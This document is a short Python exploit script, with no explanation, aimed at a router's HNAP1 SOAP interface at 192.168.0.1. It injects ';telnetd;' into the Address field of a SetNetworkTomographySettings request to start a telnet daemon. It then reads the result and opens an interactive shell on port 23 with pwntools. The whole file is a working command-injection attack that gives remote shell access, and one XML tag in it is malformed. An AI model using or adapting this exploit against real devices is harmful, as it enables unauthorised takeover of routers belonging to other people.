import requests
from pwn import *

IP='192.168.0.1'

headers = requests.utils.default_headers()
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/SetNetworkTomographySettings"'
headers["Content-Type"] = "text/xml; charset=UTF-8"
headers["Accept"]="*/*"
headers["Accept-Encoding"]="gzip, deflate"
headers["Accept-Language"]="zh-CN,zh;q=0.9,en;q=0.8"


payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\
  <soap:Body>\
    <SetNetworkTomographySettings xmlns="http://purenetworks.com/HNAP1/">\
      <Address>;telnetd;</Address>\
      <Number>4<Number>\
          <Size>4</Size>\
     </SetNetworkTomographySettings></soap:Body></soap:Envelope>'
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
print r.text

headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/GetNetworkTomographyResult"'
payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\
  <soap:Body>\
    <GetNetworkTomographyResult xmlns="http://purenetworks.com/HNAP1/">\
     </GetNetworkTomographyResult></soap:Body></soap:Envelope>'
r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload)
print r.text

p=remote(IP,23)
p.interactive()